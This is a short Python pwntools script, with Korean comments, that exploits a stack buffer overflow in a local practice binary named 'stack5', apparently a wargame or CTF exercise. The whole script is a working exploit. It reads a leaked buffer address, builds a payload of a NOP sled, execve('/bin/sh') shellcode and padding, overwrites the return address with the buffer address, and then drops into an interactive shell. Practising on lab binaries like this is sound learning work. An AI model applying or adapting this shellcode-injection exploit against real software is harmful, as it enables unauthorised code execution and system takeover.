from pwn import *

p = process('./stack5')

context.arch = 'amd64'  # amd64로 아키텍처 설정

shellcode = shellcraft.execve("/bin/sh",0,0) # execve를 실행하는 어셈블리어 코드 생성
shellcode = asm(shellcode)  # 어셈블리어 코드를 기계어 코드로 변환

# buf의 주소 출력하므로 그 뒤에 해당 값(buf 주소) 받기
p.recvuntil(b': ')  
buf_addr = int(p.recvline().strip(),16)

payload = b'\x90' * (0x28-len(shellcode))   # 쉘 코드 길이 빼고 NOP 집어넣기
payload += shellcode
payload += b'\x90' * 0x20   # 쉘 코드 앞으로도 NOP 집어넣기
payload += p64(buf_addr)

p.sendline(payload)

p.interactive()